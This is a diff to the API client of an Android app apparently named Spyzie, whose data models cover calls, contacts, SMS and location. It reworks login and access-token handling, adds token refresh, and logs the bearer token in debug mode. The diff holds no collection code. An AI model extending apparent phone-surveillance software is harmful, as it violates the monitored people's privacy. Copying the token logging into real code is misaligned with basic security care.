@@ -6,6 +6,7 @@ import android.util.Log;
 import com.androidnetworking.common.Priority;
 import com.rx2androidnetworking.Rx2AndroidNetworking;
 import com.tantd.spyzie.SpyzieApplication;
+import com.tantd.spyzie.data.model.AccessTokenResponse;
 import com.tantd.spyzie.data.model.Call;
 import com.tantd.spyzie.data.model.CommonResponse;
 import com.tantd.spyzie.data.model.Contact;
@@ -13,7 +14,7 @@ import com.tantd.spyzie.data.model.DataType;
 import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.model.Event;
 import com.tantd.spyzie.data.model.Location;
-import com.tantd.spyzie.data.model.LoginData;
+import com.tantd.spyzie.data.model.LoginRequest;
 import com.tantd.spyzie.data.model.Sms;
 import com.tantd.spyzie.util.Constants;
 import com.tantd.spyzie.util.JsonUtil;
@@ -35,7 +36,7 @@ public class AppApiManager implements ApiManager {
 
     private static AppApiManager instance;
 
-    private String accessToken;
+    private AccessTokenResponse accessToken;
 
     public static synchronized AppApiManager getInstance() {
         if (instance == null) {
@@ -55,21 +56,24 @@ public class AppApiManager implements ApiManager {
     }
 
     @Override
-    public Single<LoginData.Response> login(LoginData.Request account) {
-        return Rx2AndroidNetworking.post(ApiEndPoint.LOGIN).addBodyParameter(account)
+    public Single<AccessTokenResponse> login(LoginRequest request) {
+        return Rx2AndroidNetworking.post(ApiEndPoint.LOGIN).addBodyParameter(request)
                 .setPriority(Priority.MEDIUM)
                 .addHeaders("Accept", "application/json")
                 .addHeaders("Content-Type", "application/json")
-                .build().getObjectSingle(LoginData.Response.class);
+                .build().getObjectSingle(AccessTokenResponse.class);
     }
 
     @Override
-    public void storeAccessToken(String accessToken) {
+    public void storeAccessToken(AccessTokenResponse accessToken) {
         this.accessToken = accessToken;
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "storeAccessToken, accessToken=" + this.accessToken);
+        }
     }
 
     @Override
-    public String getAccessToken() {
+    public AccessTokenResponse getAccessToken() {
         return accessToken;
     }
 
@@ -150,7 +154,7 @@ public class AppApiManager implements ApiManager {
                     .setPriority(Priority.MEDIUM)
                     .addHeaders("Accept", "application/json")
                     .addHeaders("Content-Type", "application/json")
-                    .addHeaders("Authorization", "Bearer " + getAccessToken())
+                    .addHeaders("Authorization", "Bearer " + getAccessToken().getToken())
                     .build().getObjectSingle(CommonResponse.class);
         } else {
             return null;
@@ -164,6 +168,14 @@ public class AppApiManager implements ApiManager {
         }
         // TODO: implement here
         return null;
+    }
+
+    @Override
+    public Single<AccessTokenResponse> refreshAccessToken() {
+        return Rx2AndroidNetworking.get(ApiEndPoint.REFRESH_TOKEN)
+                .setPriority(Priority.MEDIUM)
+                .addHeaders("Authorization", "Bearer " + getAccessToken().getToken())
+                .build().getObjectSingle(AccessTokenResponse.class);
     }
 
     private <T> void print(List<T> objects) {
